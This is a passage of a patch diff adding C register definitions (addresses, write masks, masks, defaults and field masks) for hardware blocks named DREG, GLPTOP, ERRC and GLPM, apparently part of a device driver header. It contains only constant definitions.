+#define DREG_AR_DELIN1_FMASK                     (0x000000ff)
+#define DREG_AR_OVDROP_CNT0                      DREG_GLOBAL(0x0260)
+#define DREG_AR_OVDROP_CNT0_WMASK                (0xffffffff)
+#define DREG_AR_OVDROP_CNT0_MASK                 (0xffffffff)
+#define DREG_AR_OVDROP_CNT0_DEFAULT              (0x00000000)
+#define DREG_AR_OVDROP_CNT0_FMASK                (0xffffffff)
+#define DREG_AR_OVDROP_CNT1                      DREG_GLOBAL(0x0264)
+#define DREG_AR_OVDROP_CNT1_WMASK                (0xffffffff)
+#define DREG_AR_OVDROP_CNT1_MASK                 (0xffffffff)
+#define DREG_AR_OVDROP_CNT1_DEFAULT              (0x00000000)
+#define DREG_AR_OVDROP_CNT1_FMASK                (0xffffffff)
+#define DREG_AR_CERRN_CNT0                       DREG_GLOBAL(0x0280)
+#define DREG_AR_CERRN_CNT0_WMASK                 (0xffffffff)
+#define DREG_AR_CERRN_CNT0_MASK                  (0xffffffff)
+#define DREG_AR_CERRN_CNT0_DEFAULT               (0x00000000)
+#define DREG_AR_CERRN_CNT0_FMASK                 (0xffffffff)
+#define DREG_AR_CERRN_CNT1                       DREG_GLOBAL(0x0284)
+#define DREG_AR_CERRN_CNT1_WMASK                 (0xffffffff)
+#define DREG_AR_CERRN_CNT1_MASK                  (0xffffffff)
+#define DREG_AR_CERRN_CNT1_DEFAULT               (0x00000000)
+#define DREG_AR_CERRN_CNT1_FMASK                 (0xffffffff)
+#define DREG_AR_CERRNP_CNT0                      DREG_GLOBAL(0x0288)
+#define DREG_AR_CERRNP_CNT0_WMASK                (0xffffffff)
+#define DREG_AR_CERRNP_CNT0_MASK                 (0xffffffff)
+#define DREG_AR_CERRNP_CNT0_DEFAULT              (0x00000000)
+#define DREG_AR_CERRNP_CNT0_FMASK                (0xffffffff)
+#define DREG_AR_CERRNP_CNT1                      DREG_GLOBAL(0x028c)
+#define DREG_AR_CERRNP_CNT1_WMASK                (0xffffffff)
+#define DREG_AR_CERRNP_CNT1_MASK                 (0xffffffff)
+#define DREG_AR_CERRNP_CNT1_DEFAULT              (0x00000000)
+#define DREG_AR_CERRNP_CNT1_FMASK                (0xffffffff)
+#define DREG_AR_CVN_CNT0                         DREG_GLOBAL(0x0290)
+#define DREG_AR_CVN_CNT0_WMASK                   (0xffffffff)
+#define DREG_AR_CVN_CNT0_MASK                    (0xffffffff)
+#define DREG_AR_CVN_CNT0_DEFAULT                 (0x00000000)
+#define DREG_AR_CVN_CNT0_FMASK                   (0xffffffff)
+#define DREG_AR_CVN_CNT1                         DREG_GLOBAL(0x0294)
+#define DREG_AR_CVN_CNT1_WMASK                   (0xffffffff)
+#define DREG_AR_CVN_CNT1_MASK                    (0xffffffff)
+#define DREG_AR_CVN_CNT1_DEFAULT                 (0x00000000)
+#define DREG_AR_CVN_CNT1_FMASK                   (0xffffffff)
+#define DREG_AR_CVNP_CNT0                        DREG_GLOBAL(0x0298)
+#define DREG_AR_CVNP_CNT0_WMASK                  (0xffffffff)
+#define DREG_AR_CVNP_CNT0_MASK                   (0xffffffff)
+#define DREG_AR_CVNP_CNT0_DEFAULT                (0x00000000)
+#define DREG_AR_CVNP_CNT0_FMASK                  (0xffffffff)
+#define DREG_AR_CVNP_CNT1                        DREG_GLOBAL(0x029c)
+#define DREG_AR_CVNP_CNT1_WMASK                  (0xffffffff)
+#define DREG_AR_CVNP_CNT1_MASK                   (0xffffffff)
+#define DREG_AR_CVNP_CNT1_DEFAULT                (0x00000000)
+#define DREG_AR_CVNP_CNT1_FMASK                  (0xffffffff)
+#define DREG_B0_LADR                             DREG_GLOBAL(0x02a0)
+#define DREG_B0_LADR_WMASK                       (0x00001fff)
+#define DREG_B0_LADR_MASK                        (0x00001fff)
+#define DREG_B0_LADR_DEFAULT                     (0x00000000)
+#define DREG_B0_LADR_FMASK                       (0x00001fff)
+#define DREG_B1_LADR                             DREG_GLOBAL(0x02a4)
+#define DREG_B1_LADR_WMASK                       (0x00001fff)
+#define DREG_B1_LADR_MASK                        (0x00001fff)
+#define DREG_B1_LADR_DEFAULT                     (0x00000000)
+#define DREG_B1_LADR_FMASK                       (0x00001fff)
+#define DREG_MISC_RAM0                           DREG_GLOBAL(0x0300)
+#define DREG_MISC_RAM0_WMASK                     (0xffffffff)
+#define DREG_MISC_RAM0_MASK                      (0xffffffff)
+#define DREG_MISC_RAM0_DEFAULT                   (0x00000000)
+#define DREG_MISC_RAM0_FMASK                     (0xffffffff)
+#define DREG_MISCRAM1                            DREG_GLOBAL(0x0304)
+#define DREG_MISCRAM1_WMASK                      (0xffffffff)
+#define DREG_MISCRAM1_MASK                       (0xffffffff)
+#define DREG_MISCRAM1_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM1_FMASK                      (0xffffffff)
+#define DREG_MISCRAM2                            DREG_GLOBAL(0x0308)
+#define DREG_MISCRAM2_WMASK                      (0xffffffff)
+#define DREG_MISCRAM2_MASK                       (0xffffffff)
+#define DREG_MISCRAM2_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM2_FMASK                      (0xffffffff)
+#define DREG_MISCRAM3                            DREG_GLOBAL(0x030c)
+#define DREG_MISCRAM3_WMASK                      (0xffffffff)
+#define DREG_MISCRAM3_MASK                       (0xffffffff)
+#define DREG_MISCRAM3_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM3_FMASK                      (0xffffffff)
+#define DREG_MISCRAM4                            DREG_GLOBAL(0x0310)
+#define DREG_MISCRAM4_WMASK                      (0xffffffff)
+#define DREG_MISCRAM4_MASK                       (0xffffffff)
+#define DREG_MISCRAM4_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM4_FMASK                      (0xffffffff)
+#define DREG_MISCRAM5                            DREG_GLOBAL(0x0314)
+#define DREG_MISCRAM5_WMASK                      (0xffffffff)
+#define DREG_MISCRAM5_MASK                       (0xffffffff)
+#define DREG_MISCRAM5_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM5_FMASK                      (0xffffffff)
+#define DREG_MISCRAM6                            DREG_GLOBAL(0x0318)
+#define DREG_MISCRAM6_WMASK                      (0xffffffff)
+#define DREG_MISCRAM6_MASK                       (0xffffffff)
+#define DREG_MISCRAM6_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM6_FMASK                      (0xffffffff)
+#define DREG_MISCRAM7                            DREG_GLOBAL(0x031c)
+#define DREG_MISCRAM7_WMASK                      (0xffffffff)
+#define DREG_MISCRAM7_MASK                       (0xffffffff)
+#define DREG_MISCRAM7_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM7_FMASK                      (0xffffffff)
+#define DREG_MISCRAM8                            DREG_GLOBAL(0x0320)
+#define DREG_MISCRAM8_WMASK                      (0xffffffff)
+#define DREG_MISCRAM8_MASK                       (0xffffffff)
+#define DREG_MISCRAM8_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM8_FMASK                      (0xffffffff)
+#define DREG_MISCRAM9                            DREG_GLOBAL(0x0324)
+#define DREG_MISCRAM9_WMASK                      (0xffffffff)
+#define DREG_MISCRAM9_MASK                       (0xffffffff)
+#define DREG_MISCRAM9_DEFAULT                    (0x00000000)
+#define DREG_MISCRAM9_FMASK                      (0xffffffff)
+#define DREG_MISCRAM10                           DREG_GLOBAL(0x0328)
+#define DREG_MISCRAM10_WMASK                     (0xffffffff)
+#define DREG_MISCRAM10_MASK                      (0xffffffff)
+#define DREG_MISCRAM10_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM10_FMASK                     (0xffffffff)
+#define DREG_MISCRAM11                           DREG_GLOBAL(0x032c)
+#define DREG_MISCRAM11_WMASK                     (0xffffffff)
+#define DREG_MISCRAM11_MASK                      (0xffffffff)
+#define DREG_MISCRAM11_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM11_FMASK                     (0xffffffff)
+#define DREG_MISCRAM12                           DREG_GLOBAL(0x0330)
+#define DREG_MISCRAM12_WMASK                     (0xffffffff)
+#define DREG_MISCRAM12_MASK                      (0xffffffff)
+#define DREG_MISCRAM12_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM12_FMASK                     (0xffffffff)
+#define DREG_MISCRAM13                           DREG_GLOBAL(0x0334)
+#define DREG_MISCRAM13_WMASK                     (0xffffffff)
+#define DREG_MISCRAM13_MASK                      (0xffffffff)
+#define DREG_MISCRAM13_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM13_FMASK                     (0xffffffff)
+#define DREG_MISCRAM14                           DREG_GLOBAL(0x0338)
+#define DREG_MISCRAM14_WMASK                     (0xffffffff)
+#define DREG_MISCRAM14_MASK                      (0xffffffff)
+#define DREG_MISCRAM14_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM14_FMASK                     (0xffffffff)
+#define DREG_MISCRAM15                           DREG_GLOBAL(0x033c)
+#define DREG_MISCRAM15_WMASK                     (0xffffffff)
+#define DREG_MISCRAM15_MASK                      (0xffffffff)
+#define DREG_MISCRAM15_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM15_FMASK                     (0xffffffff)
+#define DREG_MISC_RAM16                          DREG_GLOBAL(0x0340)
+#define DREG_MISC_RAM16_WMASK                    (0xffffffff)
+#define DREG_MISC_RAM16_MASK                     (0xffffffff)
+#define DREG_MISC_RAM16_DEFAULT                  (0x00000000)
+#define DREG_MISC_RAM16_FMASK                    (0xffffffff)
+#define DREG_MISCRAM17                           DREG_GLOBAL(0x0344)
+#define DREG_MISCRAM17_WMASK                     (0xffffffff)
+#define DREG_MISCRAM17_MASK                      (0xffffffff)
+#define DREG_MISCRAM17_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM17_FMASK                     (0xffffffff)
+#define DREG_MISCRAM18                           DREG_GLOBAL(0x0348)
+#define DREG_MISCRAM18_WMASK                     (0xffffffff)
+#define DREG_MISCRAM18_MASK                      (0xffffffff)
+#define DREG_MISCRAM18_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM18_FMASK                     (0xffffffff)
+#define DREG_MISCRAM19                           DREG_GLOBAL(0x034c)
+#define DREG_MISCRAM19_WMASK                     (0xffffffff)
+#define DREG_MISCRAM19_MASK                      (0xffffffff)
+#define DREG_MISCRAM19_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM19_FMASK                     (0xffffffff)
+#define DREG_MISCRAM20                           DREG_GLOBAL(0x0350)
+#define DREG_MISCRAM20_WMASK                     (0xffffffff)
+#define DREG_MISCRAM20_MASK                      (0xffffffff)
+#define DREG_MISCRAM20_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM20_FMASK                     (0xffffffff)
+#define DREG_MISCRAM21                           DREG_GLOBAL(0x0354)
+#define DREG_MISCRAM21_WMASK                     (0xffffffff)
+#define DREG_MISCRAM21_MASK                      (0xffffffff)
+#define DREG_MISCRAM21_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM21_FMASK                     (0xffffffff)
+#define DREG_MISCRAM22                           DREG_GLOBAL(0x0358)
+#define DREG_MISCRAM22_WMASK                     (0xffffffff)
+#define DREG_MISCRAM22_MASK                      (0xffffffff)
+#define DREG_MISCRAM22_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM22_FMASK                     (0xffffffff)
+#define DREG_MISCRAM23                           DREG_GLOBAL(0x035c)
+#define DREG_MISCRAM23_WMASK                     (0xffffffff)
+#define DREG_MISCRAM23_MASK                      (0xffffffff)
+#define DREG_MISCRAM23_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM23_FMASK                     (0xffffffff)
+#define DREG_MISCRAM24                           DREG_GLOBAL(0x0360)
+#define DREG_MISCRAM24_WMASK                     (0xffffffff)
+#define DREG_MISCRAM24_MASK                      (0xffffffff)
+#define DREG_MISCRAM24_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM24_FMASK                     (0xffffffff)
+#define DREG_MISCRAM25                           DREG_GLOBAL(0x0364)
+#define DREG_MISCRAM25_WMASK                     (0xffffffff)
+#define DREG_MISCRAM25_MASK                      (0xffffffff)
+#define DREG_MISCRAM25_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM25_FMASK                     (0xffffffff)
+#define DREG_MISCRAM26                           DREG_GLOBAL(0x0368)
+#define DREG_MISCRAM26_WMASK                     (0xffffffff)
+#define DREG_MISCRAM26_MASK                      (0xffffffff)
+#define DREG_MISCRAM26_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM26_FMASK                     (0xffffffff)
+#define DREG_MISCRAM27                           DREG_GLOBAL(0x036c)
+#define DREG_MISCRAM27_WMASK                     (0xffffffff)
+#define DREG_MISCRAM27_MASK                      (0xffffffff)
+#define DREG_MISCRAM27_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM27_FMASK                     (0xffffffff)
+#define DREG_MISCRAM28                           DREG_GLOBAL(0x0370)
+#define DREG_MISCRAM28_WMASK                     (0xffffffff)
+#define DREG_MISCRAM28_MASK                      (0xffffffff)
+#define DREG_MISCRAM28_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM28_FMASK                     (0xffffffff)
+#define DREG_MISCRAM29                           DREG_GLOBAL(0x0374)
+#define DREG_MISCRAM29_WMASK                     (0xffffffff)
+#define DREG_MISCRAM29_MASK                      (0xffffffff)
+#define DREG_MISCRAM29_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM29_FMASK                     (0xffffffff)
+#define DREG_MISCRAM30                           DREG_GLOBAL(0x0378)
+#define DREG_MISCRAM30_WMASK                     (0xffffffff)
+#define DREG_MISCRAM30_MASK                      (0xffffffff)
+#define DREG_MISCRAM30_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM30_FMASK                     (0xffffffff)
+#define DREG_MISCRAM31                           DREG_GLOBAL(0x037c)
+#define DREG_MISCRAM31_WMASK                     (0xffffffff)
+#define DREG_MISCRAM31_MASK                      (0xffffffff)
+#define DREG_MISCRAM31_DEFAULT                   (0x00000000)
+#define DREG_MISCRAM31_FMASK                     (0xffffffff)
+#define DREG_MB0_P2D_ISRS                        DREG_GLOBAL(0x0380)
+#define DREG_MB0_P2D_ISRS_WMASK                  (0x000000ff)
+#define DREG_MB0_P2D_ISRS_MASK                   (0x000000ff)
+#define DREG_MB0_P2D_ISRS_DEFAULT                (0x00000000)
+#define DREG_MB0_P2D_ISRS_FMASK                  (0x000000ff)
+#define DREG_MB0_P2D_ISRC                        DREG_GLOBAL(0x0384)
+#define DREG_MB0_P2D_ISRC_WMASK                  (0x000000ff)
+#define DREG_MB0_P2D_ISRC_MASK                   (0x000000ff)
+#define DREG_MB0_P2D_ISRC_DEFAULT                (0x00000000)
+#define DREG_MB0_P2D_ISRC_FMASK                  (0x000000ff)
+#define DREG_MB0_P2D_ISR                         DREG_GLOBAL(0x0388)
+#define DREG_MB0_P2D_ISR_WMASK                   (0x000000ff)
+#define DREG_MB0_P2D_ISR_MASK                    (0x000000ff)
+#define DREG_MB0_P2D_ISR_DEFAULT                 (0x00000000)
+#define DREG_MB0_P2D_ISR_FMASK                   (0x000000ff)
+#define DREG_MB0_P2D_IER                         DREG_GLOBAL(0x038c)
+#define DREG_MB0_P2D_IER_WMASK                   (0x000000ff)
+#define DREG_MB0_P2D_IER_MASK                    (0x000000ff)
+#define DREG_MB0_P2D_IER_DEFAULT                 (0x00000000)
+#define DREG_MB0_P2D_IER_FMASK                   (0x000000ff)
+#define DREG_MB1_P2D_ISRS                        DREG_GLOBAL(0x03c0)
+#define DREG_MB1_P2D_ISRS_WMASK                  (0x000000ff)
+#define DREG_MB1_P2D_ISRS_MASK                   (0x000000ff)
+#define DREG_MB1_P2D_ISRS_DEFAULT                (0x00000000)
+#define DREG_MB1_P2D_ISRS_FMASK                  (0x000000ff)
+#define DREG_MB1_P2D_ISRC                        DREG_GLOBAL(0x03c4)
+#define DREG_MB1_P2D_ISRC_WMASK                  (0x000000ff)
+#define DREG_MB1_P2D_ISRC_MASK                   (0x000000ff)
+#define DREG_MB1_P2D_ISRC_DEFAULT                (0x00000000)
+#define DREG_MB1_P2D_ISRC_FMASK                  (0x000000ff)
+#define DREG_MB1_P2D_ISR                         DREG_GLOBAL(0x03c8)
+#define DREG_MB1_P2D_ISR_WMASK                   (0x000000ff)
+#define DREG_MB1_P2D_ISR_MASK                    (0x000000ff)
+#define DREG_MB1_P2D_ISR_DEFAULT                 (0x00000000)
+#define DREG_MB1_P2D_ISR_FMASK                   (0x000000ff)
+#define DREG_MB1_P2D_IER                         DREG_GLOBAL(0x03cc)
+#define DREG_MB1_P2D_IER_WMASK                   (0x000000ff)
+#define DREG_MB1_P2D_IER_MASK                    (0x000000ff)
+#define DREG_MB1_P2D_IER_DEFAULT                 (0x00000000)
+#define DREG_MB1_P2D_IER_FMASK                   (0x000000ff)
+#define DREG_MB2_D2P_ISRS                        DREG_GLOBAL(0x0390)
+#define DREG_MB2_D2P_ISRS_WMASK                  (0x000000ff)
+#define DREG_MB2_D2P_ISRS_MASK                   (0x000000ff)
+#define DREG_MB2_D2P_ISRS_DEFAULT                (0x00000000)
+#define DREG_MB2_D2P_ISRS_FMASK                  (0x000000ff)
+#define DREG_MB2_D2P_ISRC                        DREG_GLOBAL(0x0394)
+#define DREG_MB2_D2P_ISRC_WMASK                  (0x000000ff)
+#define DREG_MB2_D2P_ISRC_MASK                   (0x000000ff)
+#define DREG_MB2_D2P_ISRC_DEFAULT                (0x00000000)
+#define DREG_MB2_D2P_ISRC_FMASK                  (0x000000ff)
+#define DREG_MB2_D2P_ISR                         DREG_GLOBAL(0x0398)
+#define DREG_MB2_D2P_ISR_WMASK                   (0x000000ff)
+#define DREG_MB2_D2P_ISR_MASK                    (0x000000ff)
+#define DREG_MB2_D2P_ISR_DEFAULT                 (0x00000000)
+#define DREG_MB2_D2P_ISR_FMASK                   (0x000000ff)
+#define DREG_MB2_D2P_IER                         DREG_GLOBAL(0x039c)
+#define DREG_MB2_D2P_IER_WMASK                   (0x000000ff)
+#define DREG_MB2_D2P_IER_MASK                    (0x000000ff)
+#define DREG_MB2_D2P_IER_DEFAULT                 (0x00000000)
+#define DREG_MB2_D2P_IER_FMASK                   (0x000000ff)
+#define DREG_MB3_D2P_ISRS                        DREG_GLOBAL(0x03d0)
+#define DREG_MB3_D2P_ISRS_WMASK                  (0x000000ff)
+#define DREG_MB3_D2P_ISRS_MASK                   (0x000000ff)
+#define DREG_MB3_D2P_ISRS_DEFAULT                (0x00000000)
+#define DREG_MB3_D2P_ISRS_FMASK                  (0x000000ff)
+#define DREG_MB3_D2P_ISRC                        DREG_GLOBAL(0x03d4)
+#define DREG_MB3_D2P_ISRC_WMASK                  (0x000000ff)
+#define DREG_MB3_D2P_ISRC_MASK                   (0x000000ff)
+#define DREG_MB3_D2P_ISRC_DEFAULT                (0x00000000)
+#define DREG_MB3_D2P_ISRC_FMASK                  (0x000000ff)
+#define DREG_MB3_D2P_ISR                         DREG_GLOBAL(0x03d8)
+#define DREG_MB3_D2P_ISR_WMASK                   (0x000000ff)
+#define DREG_MB3_D2P_ISR_MASK                    (0x000000ff)
+#define DREG_MB3_D2P_ISR_DEFAULT                 (0x00000000)
+#define DREG_MB3_D2P_ISR_FMASK                   (0x000000ff)
+#define DREG_MB3_D2P_IER                         DREG_GLOBAL(0x03dc)
+#define DREG_MB3_D2P_IER_WMASK                   (0x000000ff)
+#define DREG_MB3_D2P_IER_MASK                    (0x000000ff)
+#define DREG_MB3_D2P_IER_DEFAULT                 (0x00000000)
+#define DREG_MB3_D2P_IER_FMASK                   (0x000000ff)
+#define DREG_BIN_SEM0                            DREG_GLOBAL(0x03a0)
+#define DREG_BIN_SEM0_WMASK                      (0x00000001)
+#define DREG_BIN_SEM0_MASK                       (0x00000001)
+#define DREG_BIN_SEM0_DEFAULT                    (0x00000000)
+#define DREG_BIN_SEM0_FMASK                      (0x00000001)
+#define DREG_BIN_SEM1                            DREG_GLOBAL(0x03e0)
+#define DREG_BIN_SEM1_WMASK                      (0x00000001)
+#define DREG_BIN_SEM1_MASK                       (0x00000001)
+#define DREG_BIN_SEM1_DEFAULT                    (0x00000000)
+#define DREG_BIN_SEM1_FMASK                      (0x00000001)
+
+/* GLPTOP Global Address Constants */
+#define glptop_global_base       (0x20CE00)
+#define GLPTOP_GLOBAL(r)         (int)(glptop_global_base+(r))
+#define glptop_global_size       (0x0040)
+
+#define GLP_TOP_CFG                              GLPTOP_GLOBAL(0x00)
+#define GLP_TOP_CFG_WMASK                        (0x88331111)
+#define GLP_TOP_CFG_MASK                         (0x88331111)
+#define GLP_TOP_CFG_DEFAULT                      (0x00330000)
+#define GLP_TOP_CFG_FMASK                        (0x88331111)
+#define GLP_TOP_STATUS                           GLPTOP_GLOBAL(0x04)
+#define GLP_TOP_STATUS_WMASK                     (0x00001111)
+#define GLP_TOP_STATUS_MASK                      (0x00001111)
+#define GLP_TOP_STATUS_DEFAULT                   (0x00001010)
+#define GLP_TOP_STATUS_FMASK                     (0x00001111)
+#define GLP_TX0FIFO_CFG                          GLPTOP_GLOBAL(0x10)
+#define GLP_TX0FIFO_CFG_WMASK                    (0x901f000f)
+#define GLP_TX0FIFO_CFG_MASK                     (0x901f000f)
+#define GLP_TX0FIFO_CFG_DEFAULT                  (0x00080000)
+#define GLP_TX0FIFO_CFG_FMASK                    (0x901f000f)
+#define GLP_RX0FIFO_CFG                          GLPTOP_GLOBAL(0x18)
+#define GLP_RX0FIFO_CFG_WMASK                    (0x901f000f)
+#define GLP_RX0FIFO_CFG_MASK                     (0x901f000f)
+#define GLP_RX0FIFO_CFG_DEFAULT                  (0x00080000)
+#define GLP_RX0FIFO_CFG_FMASK                    (0x901f000f)
+#define GLP_TX1FIFO_CFG                          GLPTOP_GLOBAL(0x20)
+#define GLP_TX1FIFO_CFG_WMASK                    (0x901f000f)
+#define GLP_TX1FIFO_CFG_MASK                     (0x901f000f)
+#define GLP_TX1FIFO_CFG_DEFAULT                  (0x00080000)
+#define GLP_TX1FIFO_CFG_FMASK                    (0x901f000f)
+#define GLP_RX1FIFO_CFG                          GLPTOP_GLOBAL(0x28)
+#define GLP_RX1FIFO_CFG_WMASK                    (0x901f000f)
+#define GLP_RX1FIFO_CFG_MASK                     (0x901f000f)
+#define GLP_RX1FIFO_CFG_DEFAULT                  (0x00080000)
+#define GLP_RX1FIFO_CFG_FMASK                    (0x901f000f)
+#define GLP_MISC                                 GLPTOP_GLOBAL(0x3C)
+#define GLP_MISC_WMASK                           (0x000000ff)
+#define GLP_MISC_MASK                            (0x000000ff)
+#define GLP_MISC_DEFAULT                         (0x00000000)
+#define GLP_MISC_FMASK                           (0x000000ff)
+
+/* ERRC Global Address Constants */
+#define errc_global_base       (0x20CE40)
+#define ERRC_GLOBAL(r)         (int)(errc_global_base+(r))
+#define errc_global_size       (0x0080)
+
+#define ERRC_RX1_CTRL                            ERRC_GLOBAL(0x000000)
+#define ERRC_RX1_CTRL_WMASK                      (0x00000013)
+#define ERRC_RX1_CTRL_MASK                       (0x00000013)
+#define ERRC_RX1_CTRL_DEFAULT                    (0x0002)
+#define ERRC_RX1_CTRL_FMASK                      (0x00000013)
+#define ERRC_RX1_ERRD_CTRL                       ERRC_GLOBAL(0x000004)
+#define ERRC_RX1_ERRD_CTRL_WMASK                 (0x00000311)
+#define ERRC_RX1_ERRD_CTRL_MASK                  (0x00000311)
+#define ERRC_RX1_ERRD_CTRL_DEFAULT               (0x0001)
+#define ERRC_RX1_ERRD_CTRL_FMASK                 (0x00000311)
+#define ERRC_RX1_STAT                            ERRC_GLOBAL(0x000008)
+#define ERRC_RX1_STAT_WMASK                      (0x00000001)
+#define ERRC_RX1_STAT_MASK                       (0x00000001)
+#define ERRC_RX1_STAT_DEFAULT                    (0x0000)
+#define ERRC_RX1_STAT_FMASK                      (0x00000001)
+#define ERRC_RX1_SAT_CNT                         ERRC_GLOBAL(0x00000C)
+#define ERRC_RX1_SAT_CNT_WMASK                   (0x0000ffff)
+#define ERRC_RX1_SAT_CNT_MASK                    (0x0000ffff)
+#define ERRC_RX1_SAT_CNT_DEFAULT                 (0x0000)
+#define ERRC_RX1_SAT_CNT_FMASK                   (0x0000ffff)
+#define ERRC_RX1_ERR_CNT                         ERRC_GLOBAL(0x000010)
+#define ERRC_RX1_ERR_CNT_WMASK                   (0x0000ffff)
+#define ERRC_RX1_ERR_CNT_MASK                    (0x0000ffff)
+#define ERRC_RX1_ERR_CNT_DEFAULT                 (0x0000)
+#define ERRC_RX1_ERR_CNT_FMASK                   (0x0000ffff)
+#define ERRC_RX2_CTRL                            ERRC_GLOBAL(0x000040)
+#define ERRC_RX2_CTRL_WMASK                      (0x00000013)
+#define ERRC_RX2_CTRL_MASK                       (0x00000013)
+#define ERRC_RX2_CTRL_DEFAULT                    (0x0002)
+#define ERRC_RX2_CTRL_FMASK                      (0x00000013)
+#define ERRC_RX2_ERRD_CTRL                       ERRC_GLOBAL(0x000044)
+#define ERRC_RX2_ERRD_CTRL_WMASK                 (0x00000311)
+#define ERRC_RX2_ERRD_CTRL_MASK                  (0x00000311)
+#define ERRC_RX2_ERRD_CTRL_DEFAULT               (0x0001)
+#define ERRC_RX2_ERRD_CTRL_FMASK                 (0x00000311)
+#define ERRC_RX2_STAT                            ERRC_GLOBAL(0x000048)
+#define ERRC_RX2_STAT_WMASK                      (0x00000001)
+#define ERRC_RX2_STAT_MASK                       (0x00000001)
+#define ERRC_RX2_STAT_DEFAULT                    (0x0000)
+#define ERRC_RX2_STAT_FMASK                      (0x00000001)
+#define ERRC_RX2_SAT_CNT                         ERRC_GLOBAL(0x00004C)
+#define ERRC_RX2_SAT_CNT_WMASK                   (0x0000ffff)
+#define ERRC_RX2_SAT_CNT_MASK                    (0x0000ffff)
+#define ERRC_RX2_SAT_CNT_DEFAULT                 (0x0000)
+#define ERRC_RX2_SAT_CNT_FMASK                   (0x0000ffff)
+#define ERRC_RX2_ERR_CNT                         ERRC_GLOBAL(0x000050)
+#define ERRC_RX2_ERR_CNT_WMASK                   (0x0000ffff)
+#define ERRC_RX2_ERR_CNT_MASK                    (0x0000ffff)
+#define ERRC_RX2_ERR_CNT_DEFAULT                 (0x0000)
+#define ERRC_RX2_ERR_CNT_FMASK                   (0x0000ffff)
+
+/* GLPM Global Address Constants */
+#define glpm_global_base       (0x20CC00)
+#define GLPM_GLOBAL(r)         (int)(glpm_global_base+(r))
+#define glpm_global_size       (0x0200)
+
+#define GLPM_GLP_FR_CTRL_0                       GLPM_GLOBAL(0x000000)
+#define GLPM_GLP_FR_CTRL_0_WMASK                 (0x00007f7f)
+#define GLPM_GLP_FR_CTRL_0_MASK                  (0x00007f7f)
+#define GLPM_GLP_FR_CTRL_0_DEFAULT               (0x0000)
+#define GLPM_GLP_FR_CTRL_0_FMASK                 (0x00007f7f)
+#define GLPM_GLP_FR_CTRL_1                       GLPM_GLOBAL(0x000004)
+#define GLPM_GLP_FR_CTRL_1_WMASK                 (0x00007f7f)
+#define GLPM_GLP_FR_CTRL_1_MASK                  (0x00007f7f)
+#define GLPM_GLP_FR_CTRL_1_DEFAULT               (0x0000)
+#define GLPM_GLP_FR_CTRL_1_FMASK                 (0x00007f7f)
+#define GLPM_GLP_FR_STATUS_0                     GLPM_GLOBAL(0x000008)
+#define GLPM_GLP_FR_STATUS_0_WMASK               (0x00007fff)
+#define GLPM_GLP_FR_STATUS_0_MASK                (0x00007fff)
+#define GLPM_GLP_FR_STATUS_0_DEFAULT             (0x0000)
+#define GLPM_GLP_FR_STATUS_0_FMASK               (0x00007fff)
+#define GLPM_GLP_FR_STATUS_1                     GLPM_GLOBAL(0x00000C)
+#define GLPM_GLP_FR_STATUS_1_WMASK               (0x00007fff)
+#define GLPM_GLP_FR_STATUS_1_MASK                (0x00007fff)
+#define GLPM_GLP_FR_STATUS_1_DEFAULT             (0x0000)
+#define GLPM_GLP_FR_STATUS_1_FMASK               (0x00007fff)
+#define GLPM_GLP_FR_WD_AL_0                      GLPM_GLOBAL(0x000010)
+#define GLPM_GLP_FR_WD_AL_0_WMASK                (0x0000007f)
+#define GLPM_GLP_FR_WD_AL_0_MASK                 (0x0000007f)
+#define GLPM_GLP_FR_WD_AL_0_DEFAULT              (0x0025)
+#define GLPM_GLP_FR_WD_AL_0_FMASK                (0x0000007f)
+#define GLPM_GLP_FR_WD_AL_1                      GLPM_GLOBAL(0x000014)
+#define GLPM_GLP_FR_WD_AL_1_WMASK                (0x0000007f)
+#define GLPM_GLP_FR_WD_AL_1_MASK                 (0x0000007f)
+#define GLPM_GLP_FR_WD_AL_1_DEFAULT              (0x0025)
+#define GLPM_GLP_FR_WD_AL_1_FMASK                (0x0000007f)
+#define GLPM_GLP_FR_MISC_0                       GLPM_GLOBAL(0x000018)
+#define GLPM_GLP_FR_MISC_0_WMASK                 (0x00003fff)
+#define GLPM_GLP_FR_MISC_0_MASK                  (0x00003fff)
+#define GLPM_GLP_FR_MISC_0_DEFAULT               (0x0407)
+#define GLPM_GLP_FR_MISC_0_FMASK                 (0x00003fff)
+#define GLPM_GLP_FR_MISC_1                       GLPM_GLOBAL(0x00001C)
+#define GLPM_GLP_FR_MISC_1_WMASK                 (0x00003fff)
+#define GLPM_GLP_FR_MISC_1_MASK                  (0x00003fff)
+#define GLPM_GLP_FR_MISC_1_DEFAULT               (0x0407)
+#define GLPM_GLP_FR_MISC_1_FMASK                 (0x00003fff)
+#define GLPM_GLP_FR_BITLOCK_0                    GLPM_GLOBAL(0x000020)
+#define GLPM_GLP_FR_BITLOCK_0_WMASK              (0x000000ff)
+#define GLPM_GLP_FR_BITLOCK_0_MASK               (0x000000ff)
+#define GLPM_GLP_FR_BITLOCK_0_DEFAULT            (0x000A)
+#define GLPM_GLP_FR_BITLOCK_0_FMASK              (0x000000ff)
+#define GLPM_GLP_FR_BITLOCK_1                    GLPM_GLOBAL(0x000024)
